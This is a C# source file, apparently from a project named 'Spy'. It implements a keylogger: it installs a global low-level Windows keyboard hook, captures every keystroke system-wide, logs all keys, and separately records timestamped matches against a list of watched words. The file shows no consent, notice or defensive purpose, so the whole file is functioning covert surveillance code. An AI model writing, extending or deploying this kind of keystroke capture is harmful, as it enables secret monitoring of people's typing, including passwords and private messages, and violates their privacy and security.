using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Spy
{
    internal class Hook
    {
        private static object resLocker = new object();
        public static Hook instance = null;
        private Hook() { }
        public static Hook Instance
        {
            get
            {
                if (instance == null) 
                {
                    lock (resLocker)
                    {
                        instance = new Hook();
                    }
                }
                return instance;
            }
        }
        private static Keys key;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_KEYBOARD_LL = 13;
        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);
        #region Import DLL
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr UnhookWindowsHookEx(IntPtr hHook);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hHook, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(String lpModuleName);
        #endregion
        private static HookProc kbProc = KbHookCallBack;
        private static IntPtr kbHook;
        private static IntPtr KbHookCallBack(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int keyCode = Marshal.ReadInt32(lParam);
                Keys keyEnum = (Keys)keyCode;
                key = keyEnum;
            }
            return CallNextHookEx(kbHook, nCode, wParam, lParam);
        }
        public void StartHook()
        {
            key = Keys.None;
            using (Process process = Process.GetCurrentProcess())
            using (ProcessModule module = process.MainModule)
            { 
                kbHook = SetWindowsHookEx(WM_KEYBOARD_LL, kbProc, 
                         GetModuleHandle(module.ModuleName), 0); 
            }
        }
        public void StopHook() 
        { 
            UnhookWindowsHookEx(kbHook); 
        }
        public void ManageKeydown(Logs log, List<String> Words, CancellationToken token)
        {
            String InputKey = string.Empty;
            while (!token.IsCancellationRequested)
            {
                if (Keys.None != key)
                {
                    InputKey += key.ToString();
                    foreach (var word in Words)
                    {
                        if (Regex.IsMatch(InputKey, word, RegexOptions.IgnoreCase))
                        {
                            lock (resLocker)
                            {
                                log.ManageInputWords[log.ManageInputWords.Count - 1] += DateTime.Now + " " + word + "\n";
                            }
                            InputKey = String.Empty;
                        }
                    }
                    key = Keys.None;
                }
            }
        }
        public void StatisticsKeydown(Logs log, CancellationToken token)
        {
            String InputKey = string.Empty;
            while (!token.IsCancellationRequested)
            {
                if (Keys.None != key)
                {
                    InputKey += key.ToString();
                    lock (resLocker)
                    {
                        log.StatisticsKeyDown[log.StatisticsKeyDown.Count - 1] += "\'" + key + "\' ";
                    }
                    InputKey = String.Empty;
                    key = Keys.None;
                }
            }
        }
    }
}


